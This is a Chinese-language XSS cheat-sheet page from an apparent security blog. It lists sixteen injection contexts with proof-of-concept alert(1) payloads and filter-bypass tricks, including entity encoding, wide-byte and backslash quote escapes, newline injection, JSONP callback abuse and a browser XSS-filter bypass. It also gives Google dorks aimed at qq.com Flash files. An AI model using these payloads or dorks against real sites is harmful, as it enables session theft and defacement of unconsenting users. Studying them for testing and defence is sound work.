---
layout: default
---
# ![](../img/hj.jpg)XSS模型
>小贱提示：

```
常规来讲，
onxxxx="[输出]"
href="javascript:[输出]"
<script>[输出]</script>

在script中如果遇到过滤，可考虑eval（'alert（1）'）
三者没有太大区别，因为输出所在的地方都是js脚本
但<script>如果被过滤，往往没有太好的办法，而前两这有个很好的方法：
在html属性中，会自动对实体字符转义，比如
<img src="1" onerror="alert(1)">和
<img src="1" onerror="alert&#x28;1&#x29">等效。
换言之，只要上面的情况，没有过滤&#等，可跨
```

## ![](../img/github14.png)模型1：无过滤
```
<html>输出</html>
<html>......</html>输出<html>......</html>
思路：
直接<script>alert(1)</script>
```
## ![](../img/github15.png)模型2：

>\<script>...[输出]...\</script>\<style>...[输出]...\</script>

思路：
```
闭合前段标签,再<script>alert(1)
如果过滤</>，就eval('alert(1)');void
```
## ![](../img/github16.png)模型3：输出在标签属性里
```
<input value="输出">
<img onload="...[输出]...">
<body style="...[输出]...">
<svg onload=alert(1)>
```
1.无过滤: aaa'' onclick=alert(1)

2.出现在style属性中可
   ;w:expr\\65ssion:eval('alert(1)')
   css的expression浏览器多数淘汰了

3
```
<HTML标签 onXXXX="...[输出]..">
<a href="javascript:.....[输出]">xxxx </a>的方法，
如：
<img src=''#'' onerror=alert(/xss/)>
过滤的话就<img src="1" onerror="alert&#x28;1&#x29;">
如果&#39被过滤，可十六进制&#x27代替
如果在url中还可以把&#用url转码
```
## ![](../img/github17.png)模型4：宽字符
```
<script>和</script>之间：
有过滤引号导致不能闭合
gbxxxx系列编码，可尝试宽字节
%22的引号被过滤，可尝试%c0%22
%c0可以吃掉%5c
```
## ![](../img/github18.png)模型5：反斜杠\
```
<script>和</script>之间：
有过滤引号导致不能闭合
可利用原本的引号，aaaa\就使后面的原本引号变成了我们自己的，但要注意后面的语法，要//注释掉，要不语法错误
另可用/**/代替空格
```
## ![](../img/github19.png)模型6：换行符%0a
```
<script>和</script>之间：
适用于aaa出现在注释中时,
%0aalert(1);//这样就把alert换行,成功执行
```
## ![](../img/github20.png)模型7：宽字符，反斜杠，换行符一起
## ![](../img/github21.png)模型8：dom xss显式输出
```
这种情况下。xxxxx
只能使用 <img src=1 onerror=alert(1)> 这种方式来触发 JS

document.write(''xxxx'')
js中的字符可写成unicode编码
<是\u003c  或 \x3c
>是\u003e  或 \x3e
空格是\u0020
单引号是\u0027或\x27
其实数字还是ascii码
dom举例
document.getElementById(1).innerHTML=''检索: \u003cimg src=1 onerror=alert(1)\u003e'';
```
## ![](../img/github22.png)模型9：dom xss隐式输出
源代码看不到就f12搜索
## ![](../img/github23.png)模型10：dom eval
## ![](../img/github24.png)模型11：dom iframe
```
<iframe src='输出'><iframe>
解题：
1.<iframe onload=''alert(1)''></iframe>
2.<iframe src='javascript:alert(1)'>
   </iframe>
3.<iframe src='vbscript:msgbox(1)'>
   </iframe> (IE下）
4.<iframe src='data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;'>
    </iframe> (chrome下）
5.<iframe src='data:text/html,<script>alert(1)</script>'>
    <iframe>(chrome下）
6.<iframe srcdoc='',&lt;script&gt;alert(1)&lt;/script&gt;''> </iframe> (chrome下）
```
## ![](../img/github25.png)模型12：callback
```
somescript src=''http://../xx?jsonp=callback&id=''+id
场景1：script src=''完全可控''
               直接换js地址
场景2：script src=''/path/路径可控/1.js''
               这种两种方法：
              1，上传文件到同域名下
              2，利用json接口最终变为
               script src=''/../xx.json?callback=alert(1)''
场景3：
script src=''/xx/json.php?callback=xx&param1=yy&param2=可控''
方法类似场景2，param2=xx&callback=alert(1)
可覆盖前面的callback
还可以callback=eval(alert(1))
后面还有参数的话记得;void
```

## ![](../img/github26.png)模型13
```
<script>
setTimeout(''window.location.href='http//../可控';'',2000);</script>
方法1：aa';alert(1);a='
方法2：想办法变成
location.href=''javascript:alert(1)';
a'.replace(/.+/,
/javascript:alert(1)/.source);//
```
## ![](../img/github27.png)模型14 flash xss入门
```
首先要找到flash文件,google dork
1基本语法site:qq.com filetype:swf
2已知存在缺陷的flash文件名或参数名
如swfupload，jwplayer等
3多媒体功能的flash文件名
如upload，player，music，video等
4调用的外部配置或数据文件后缀
如xml，php等
5特征名用词
如callback，cb，function等

举例 site:qq.com filetype:swf inurl:xml
flash具体还是看那些年吧

```
## ![](../img/github28.png)模型15 xss浏览器过滤器绕过(一般方法）
```
要符合两点要求：
1：允许<>
2：缺陷点后方要有</script>
则："><script src=data:,alert(1)<!--
```
## ![](../img/github2.png)模型16 xss存储型




__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
